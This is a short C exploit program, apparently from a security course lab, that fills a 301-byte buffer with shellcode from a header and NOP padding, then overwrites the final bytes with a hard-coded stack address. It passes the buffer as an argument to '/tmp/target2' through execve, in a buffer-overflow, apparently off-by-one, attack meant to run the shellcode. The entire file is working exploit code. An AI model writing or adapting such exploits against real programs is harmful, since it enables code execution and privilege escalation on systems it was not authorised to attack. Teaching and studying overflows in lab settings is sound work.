#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];

  char attack[301];

  int i;
  int length=sizeof(shellcode);
  
  for(i=0;i<300;i++)
  {
     if(i<length-1)
     {
        attack[i]=shellcode[i];
     }
     else
        attack[i]=0x90;
  }
  attack[300]=0x30; 
  attack[299]=0xbf; 
  attack[298]=0xff; 
  attack[297]=0xfc;
  attack[296]=0x0c;
  args[0] = TARGET; args[1] = attack; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
